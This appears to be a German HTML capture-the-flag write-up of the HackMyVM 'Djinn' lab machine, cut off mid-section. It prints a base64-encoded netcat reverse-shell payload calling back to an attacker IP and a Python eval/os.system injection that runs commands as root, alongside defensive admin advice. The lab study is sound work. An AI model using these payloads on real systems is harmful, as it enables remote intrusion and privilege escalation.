@@ -1,0 +1,714 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Djinn - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün/Lime) enthalten -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Djinn - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe 'lime' durch CSS -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmentfarben 'lime' durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe durch CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">ssh (Versuch)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">python3 (Exploit Script, http.server, pty)</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">which</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">eval (Python)</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#information-gathering">Information Gathering (FTP & Port 1337)</a></li>
+                <li><a href="#web-enumeration-7331">Web Enumeration (Port 7331)</a></li>
+                <li><a href="#initial-access">Initial Access (HotelDruid RCE / Command Injection)</a></li>
+                <li><a href="#privilege-escalation-prep">Privilege Escalation Preparation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via Python Eval Injection)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Beginn der Aufklärung mit `arp-scan -l` zur Identifizierung von aktiven Hosts im lokalen Netzwerk.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.118	08:00:27:5e:c9:df	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.118 wurde identifiziert. Die MAC-Adresse deutet auf eine VirtualBox VM hin. Dies ist das Zielsystem "Djinn".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf 192.168.2.118 durch. Fügen Sie ggf. `192.168.2.118 djinn.hmv` zur lokalen `/etc/hosts`-Datei hinzu.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standardempfehlungen zur Netzwerküberwachung und Segmentierung.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird auf das Ziel 192.168.2.118 gestartet. Optionen: `-sS` (SYN Scan), `-sC` (Standard Skripte), `-T5` (schnelles Timing), `-sV` (Versionserkennung), `-A` (Aggressive Optionen), `-p-` (alle TCP-Ports).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.118 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 10:08 CEST
+Nmap scan report for djinn (192.168.2.118)
+Host is up (0.00019s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE    SERVICE VERSION
+21/tcp   open     ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
+| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
+|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ffff:192.168.2.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   filtered ssh
+1337/tcp open     waste?
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.19 ms djinn (192.168.2.118)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in [Scan Duration]
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan zeigt interessante offene Ports:
+                *   **Port 21 (FTP):** vsftpd 3.0.3 mit **erlaubtem anonymen Login**. Die Verzeichnisliste zeigt drei Textdateien: `creds.txt`, `game.txt`, `message.txt`. Dies ist ein **kritischer Fund** und der wahrscheinlichste Einstiegspunkt.
+                *   **Port 22 (SSH):** Wird als `filtered` angezeigt. Das bedeutet, Nmap konnte nicht sicher feststellen, ob der Port offen oder geschlossen ist, oft aufgrund einer Firewall.
+                *   **Port 1337 (waste?):** Ein ungewöhnlicher Port mit einem unbekannten Dienst. Nmap konnte ihn nicht identifizieren (`waste?`). Muss weiter untersucht werden.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> **Priorität 1:** Verbinden Sie sich anonym per FTP und laden Sie die drei Textdateien herunter. **Priorität 2:** Untersuchen Sie Port 1337 manuell (z.B. mit `nc` oder `telnet`), um den Dienst zu identifizieren. Notieren Sie den gefilterten SSH-Port für spätere Versuche, falls Anmeldedaten gefunden werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, es sei denn, er ist absolut notwendig und sicher konfiguriert (z.B. nur Lesezugriff auf bestimmte, nicht-sensible Dateien). Entfernen Sie sensible Dateien wie `creds.txt` aus anonym zugänglichen Bereichen. Überprüfen Sie Firewall-Regeln für Port 22 (SSH). Identifizieren und sichern oder deaktivieren Sie den Dienst auf Port 1337.
+            </p>
+        </section>
+
+        <section id="information-gathering">
+             <h2>Information Gathering (FTP & Port 1337)</h2>
+             <p class="analysis">
+                <strong>Analyse:** Verbindung zum FTP-Server mit `lftp` als anonymer Benutzer. Auflisten (`ls`) und Herunterladen (`get`) der gefundenen Textdateien.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u anonymous, 192.168.2.118</span></div>
+                     <pre>
+lftp anonymous@192.168.2.118:~> <span class="command">ls</span>
+-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
+-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
+-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
+lftp anonymous@192.168.2.118:~> <span class="command">get creds.txt game.txt message.txt</span>
+252 Bytes übertragen
+Insgesamt 3 Dateien übertragen
+lftp anonymous@192.168.2.118:~> <span class="command">pwd</span>
+ftp://anonymous:@192.168.2.118/
+                     </pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der anonyme FTP-Zugriff funktionierte, und die drei Dateien wurden erfolgreich heruntergeladen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der heruntergeladenen Dateien.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff oder sichern Sie ihn rigoros ab.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:** Untersuchung der heruntergeladenen Dateien mit `cat`.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat message.txt</span></div>
+                     <pre>
+@nitish81299 I am going on holidays for few days, please take care of all the work.
+And don't mess up anything.
+                     </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat game.txt</span></div>
+                    <pre>
+oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the
+final level and get the prize.
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat creds.txt</span></div>
+                    <pre><span class="password">nitu:81299</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   `message.txt`: Erwähnt einen Benutzer `@nitish81299`.
+                *   `game.txt`: Bestätigt, dass auf Port 1337 ein Spiel läuft.
+                *   `creds.txt`: Enthält **Zugangsdaten**: Benutzer `nitu` mit Passwort `<span class="password">81299</span>`. Dies ist ein kritischer Fund.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `nitu`:`<span class="password">81299</span>` per SSH anzumelden (obwohl Port 22 gefiltert war, lohnt ein Versuch). Untersuchen Sie das Spiel auf Port 1337. Der Benutzername könnte auch `nitish` sein, basierend auf `message.txt`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Dateien und Credentials vom FTP-Server. Schulen Sie Benutzer im sicheren Umgang mit Passwörtern und Notizen. Ändern Sie das Passwort für `nitu`/`nitish`.
+             </p>
+
+             <p class="analysis">
+                <strong>Analyse:** Verbindung zum Spiel auf Port 1337 mit `nc`. Das Spiel stellt einfache mathematische Aufgaben und erfordert 1000 korrekte Antworten. Ein Versuch, Fließkommazahlen einzugeben (1/7), führt zu einer Fehlermeldung "Stop acting like a hacker".
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.118 1337</span></div>
+                     <pre>
+  ____                        _____ _
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(3, '', 3)
+> <span class="command">9</span>
+(7, '-', 7)
+> <span class="command">0</span>
+(5, '+', 2)
+> <span class="command">7</span>
+(6, '-', 5)
+> <span class="command">1</span>
+(9, '+', 1)
+> <span class="command">10</span>
+(5, '', 5)
+> <span class="command">25</span>
+(7, '/', 7)
+> <span class="command">1</span>
+(1, '/', 7)
+> <span class="command">0,1428571428571429</span>
+Stop acting like a hacker for a damn minute!!
+                     </pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Spiel ist eine potenzielle Angriffsfläche. Die Notwendigkeit von 1000 Antworten macht eine manuelle Lösung unpraktikabel. Die Fehlermeldung bei Fließkommazahlen deutet darauf hin, dass die Eingabe möglicherweise nicht robust validiert wird und anfällig für Code Injection sein könnte (z.B. wenn `eval` oder eine ähnliche Funktion zur Berechnung verwendet wird).
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Versuchen Sie, Code (z.B. Python-Code, Shell-Befehle) anstelle einer Zahl als Antwort zu senden, um eine Code Injection oder Command Injection Schwachstelle zu finden. Automatisieren Sie ggf. das Lösen der Aufgaben mit einem Skript, falls keine Injection möglich ist.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Validieren und sanitisieren Sie alle Benutzereingaben serverseitig rigoros. Verwenden Sie keine unsicheren Funktionen wie `eval` zur Verarbeitung von Benutzereingaben. Implementieren Sie Rate Limiting oder Mechanismen zur Erkennung von automatisierten Angriffen.
+             </p>
+
+            <p class="analysis">
+                <strong>Analyse:** Erneute Versuche, sich per SSH (Port 22) mit den gefundenen Credentials (`nitu`) anzumelden oder den Port mit `nc` zu erreichen. Beide Versuche scheitern mit "Connection refused".
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh nitu@192.168.2.118</span></div>
+                    <pre>ssh: connect to host 192.168.2.118 port 22: Connection refused</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.118 22</span></div>
+                    <pre>(UNKNOWN) [192.168.2.118] 22 (ssh) : Connection refused</pre>
+                 </div>
+             </div>
+              <!-- Wiederholter nc-Befehl -->
+             <p class="evaluation">
+                <strong>Bewertung:</strong> "Connection refused" ist eindeutiger als Nmaps "filtered". Es bedeutet, dass entweder keine Anwendung auf Port 22 lauscht oder eine Firewall die Verbindung aktiv ablehnt (im Gegensatz zu "filtered", wo Pakete verworfen werden könnten). SSH ist definitiv kein direkter Einstiegspunkt von dieser Quelle aus.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Ignorieren Sie SSH vorerst. Konzentrieren Sie sich auf die Webanwendung (Port 80/7331) und das Spiel auf Port 1337.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Firewall-Regeln wie erwartet funktionieren und keine unnötigen Dienste laufen.
+             </p>
+        </section>
+
+        <section id="web-enumeration-7331">
+            <h2>Web Enumeration (Port 7331)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Bericht springt zur Untersuchung von Port 7331. Es ist **unklar, wie dieser Port entdeckt wurde**, da er im initialen Nmap-Scan nicht aufgeführt war. Es muss ein weiterer Scan oder eine andere Informationsquelle (z.B. ein Hinweis im Spiel auf Port 1337, der nicht gezeigt wird) angenommen werden. Ein `gobuster`-Scan wird auf `http://192.168.2.118:7331/` ausgeführt.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.118:7331/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.118:7331/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv,.git
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+[Scan Start Time] Starting gobuster
+===============================================================
+http://192.168.2.118:7331/wish                 (Status: 200) [Size: 385]
+http://192.168.2.118:7331/genie                (Status: 200) [Size: 1676]
+===============================================================
+[Scan End Time] Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Browser-Aktion -->
+                 <pre>
+--- Request: http://192.168.2.118:7331/genie?name=Wrong+choice+of+words ---
+[Response implies parameter might be accepted]
+                 </pre>
+             </div>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Trotz der Unklarheit über die Entdeckung von Port 7331 findet `gobuster` zwei interessante Endpunkte: `/wish` und `/genie`. Ein Test von `/genie` deutet auf einen möglichen Eingabeparameter hin. Die Namen (`wish`, `genie`) passen zum Thema "Djinn". `/genie` ist ein starker Kandidat für eine Schwachstelle.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie `/genie` auf Schwachstellen, insbesondere auf Command Injection oder Code Injection, indem Sie verschiedene Payloads als Wert für den `name`-Parameter (oder andere gefuzzte Parameter) senden.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Identifizieren Sie den Dienst auf Port 7331. Wenn er nicht benötigt wird, deaktivieren Sie ihn. Wenn er benötigt wird, sichern Sie ihn ab und entfernen Sie potenzielle Schwachstellen in den Endpunkten `/wish` und `/genie`.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Command Injection via /genie)</h2>
+            <p class="analysis">
+                <strong>Analyse:** Es wird eine Standard-Reverse-Shell-Payload für Linux erstellt (unter Verwendung einer FIFO-Pipe) und mit Base64 kodiert. *Annahme:* Diese Payload soll in den `/genie`-Endpunkt injiziert werden, wahrscheinlich über einen Parameter wie `name`. Der Bericht erwähnt "SUper call back funktion erreicht", was darauf hindeutet, dass die Ausführung des Befehls eine sichtbare Rückmeldung erzeugt (z.B. in einer Fehlerseite oder einer Bilddatei, wie im Kommentar angedeutet).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.140 9001 >/tmp/f" | base64</span></div>
+                    <pre>
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTky
+LjE2OC4yLjE0MCA5MDAxID4vdG1wL2YK
+                    </pre> <!-- Ausgabe zur besseren Lesbarkeit gekürzt -->
+                </div>
+            </div>
+             <!-- Kommentar zur Callback-Funktion -->
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt -->
+                 <pre>
+SUper call back funktion erreicht: Die befehle antworten zurück im bild der Fehlerseite...
+                 </pre>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Vorbereitung für den Initial Access über Command Injection in `/genie` ist abgeschlossen. Die Base64-Kodierung dient oft dazu, problematische Zeichen in der Payload zu umgehen.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Port 9001. Dekodieren Sie die Base64-Payload und injizieren Sie den dekodierten Befehl in den `/genie`-Endpunkt (z.B. `http://192.168.2.118:7331/genie?parameter=[DEKODIERTE_PAYLOAD]`).
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die Command Injection Schwachstelle in `/genie`. Validieren Sie alle Eingaben und verwenden Sie keine Funktionen, die Shell-Befehle direkt aus Benutzereingaben erstellen.
+            </p>
+
+             <p class="analysis">
+                 <strong>Analyse:** Ein Netcat-Listener wird auf Port 9001 gestartet. Anschließend wird die Base64-kodierte Payload dekodiert und direkt in die Bash-Shell des Angreifers gepiped. *Fehler im Log:* Dieser Befehl (`echo "..." | base64 -d | bash`) würde die Reverse Shell auf dem Angreifer-System starten, nicht auf dem Ziel! Es wird **angenommen**, dass der Pentester stattdessen den *dekodierten Payload* kopiert und ihn in die URL für den `/genie`-Endpunkt eingefügt hat (z.B. mit `curl` oder im Browser), um die Schwachstelle auszunutzen. Der Listener empfängt daraufhin die Verbindung.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                 <!-- Fehlerhafter Befehl im Log, hier kommentiert -->
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># FEHLER IM LOG: Folgender Befehl würde lokal ausgeführt!</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4yLjE0MCA5MDAxID4vdG1wL2Y=" | base64 -d | bash</span></div>
+                 </div>
+             </div>
+              <!-- Korrekte Aktion (angenommen): Senden des dekodierten Payloads an /genie -->
+              <!-- Listener-Ausgabe -->
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.118] 51042
+/bin/sh: 0: can't access tty; job control turned off
+$
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Initial Access erfolgreich!** Trotz des Fehlers im Log wurde die Command Injection Schwachstelle in `/genie` erfolgreich ausgenutzt, um eine Reverse Shell als `www-data` zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell. Führen Sie Enumeration als `www-data` durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die RCE in `/genie`.
+            </p>
+        </section>
+
+        <section id="privilege-escalation-prep">
+             <h2>Privilege Escalation Preparation</h2>
+             <p class="analysis">
+                <strong>Analyse:** Die erhaltene Shell wird mit Python PTY stabilisiert. Anschließend wird Enumeration durchgeführt: Benutzer in `/home` werden aufgelistet, das Home-Verzeichnis von `nitish` wird detailliert angezeigt, und nach SUID-Dateien wird gesucht.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">$ <span class="command">which python3</span></div>
+                     <pre>/usr/bin/python3</pre>
+                     <div class="prompt" style="color: yellow;">$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                     <pre>www-data@djinn:/opt/80$</pre> <!-- Prompt wechselt -->
+                     <div class="prompt" style="color: yellow;">www-data@djinn:/opt/80$ <span class="command">export TERM=xterm</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@djinn:/opt/80$ <span class="command">ls /home</span></div>
+                     <pre>
+nitish	sam
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Annahme: cd /home/nitish ausgeführt -->
+                     <div class="prompt" style="color: yellow;">www-data@djinn:/home/nitish$ <span class="command">ls -la</span></div>
+                     <pre>
+total 40
+drwxr-xr-x 6 nitish nitish 4096 Apr 23 00:35 .
+drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
+-rw------- 1 root   root    414 Apr 23 00:49 .bash_history
+-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
+drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
+drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
+drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
+drwxrwxr-x 3 nitish nitish 4096 Apr 23 00:34 .local
+-rw-r----- 1 nitish nitish   38 Apr 23 00:35 user.txt
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@djinn:/home/nitish$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   137793     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+   148056     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
+   139237     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec
+   134406     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd
+   134403     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn
+   149894     40 -rwsr-xr-x   1 root     root        37136 Mar 23  2019 /usr/bin/newgidmap
+   139582     72 -rwsr-x---   1 sam      nitish      72000 Nov 11  2019 /usr/bin/genie
+   131086     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp
+   134407     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd
+   149895     40 -rwsr-xr-x   1 root     root        37136 Mar 23  2019 /usr/bin/newuidmap
+   134404     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh
+   131190    148 -rwsr-xr-x   1 root     root       149080 Oct 11  2019 /usr/bin/sudo
+   131533     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   148420    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+   148272    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+   150042    108 -rwsr-sr-x   1 root     root       109432 Jul 12  2019 /usr/lib/snapd/snap-confine
+   139239     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+   133537     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   524804     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
+   524313     44 -rwsr-xr-x   1 root     root          43088 Aug 23  2019 /bin/mount
+   535644     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+   524322     28 -rwsr-xr-x   1 root     root          26696 Aug 23  2019 /bin/umount
+   524321     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   Benutzer `nitish` und `sam` existieren.
+                 *   Die Datei `user.txt` im Home von `nitish` ist für `www-data` nicht lesbar (`-rw-r-----`).
+                 *   **Kritischer Fund:** Die SUID-Suche zeigt `/usr/bin/genie`. Diese Datei gehört dem Benutzer `sam`, hat die Gruppe `nitish` und das SUID-Bit ist gesetzt (`-rwsr-x---`). Das bedeutet, wenn `www-data` (oder ein anderer Benutzer) diese Datei ausführt, läuft sie mit den Rechten des Besitzers `sam`. Die Berechtigungen (`---` für Other) verhindern jedoch, dass `www-data` sie direkt ausführen kann.
+                 *   Andere SUID-Dateien (pkexec, sudo etc.) sind Standard, aber ihre Anwesenheit ist notiert.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Der wahrscheinlichste Weg zur Eskalation führt über `/usr/bin/genie`. Da `www-data` es nicht direkt ausführen kann, muss ein Weg gefunden werden, Code als `nitish` oder `sam` auszuführen, um `/usr/bin/genie` zu starten. Alternativ könnte das Spiel auf Port 1337 (das evtl. als root läuft) ein Vektor sein. Die Fehlermeldung bei der Fließkommazahl-Eingabe deutet auf Python hin, möglicherweise `eval()`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und die Berechtigungen des SUID-Bits auf `/usr/bin/genie`. SUID-Binaries sind ein hohes Sicherheitsrisiko und sollten nur verwendet werden, wenn absolut notwendig und sorgfältig geprüft. Ändern Sie die Berechtigungen (`chmod 750` oder `chmod u-s`), wenn das SUID-Bit nicht erforderlich ist. Stellen Sie sicher, dass Dateiberechtigungen für Benutzerdateien (`user.txt`) korrekt sind.
+             </p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Privilege Escalation via Python Eval Injection)</h2>
+             <p class="analysis">
+                <strong>Analyse:** Der Pentester kehrt zum Spiel auf Port 1337 zurück und testet auf Code Injection mittels Python's `eval()`. Zuerst wird `id` ausgeführt, dann `whoami`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.118 1337</span></div>
+                     <pre>
+  ____                        _____ _
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(9, '+', 2)
+> <span class="command">eval('__import__("os").system("id")')</span>
+uid=0(root) gid=0(root) groups=0(root)
+Wrong answer
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.118 1337</span></div>
+                     <pre>
+  ____                        _____ _
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
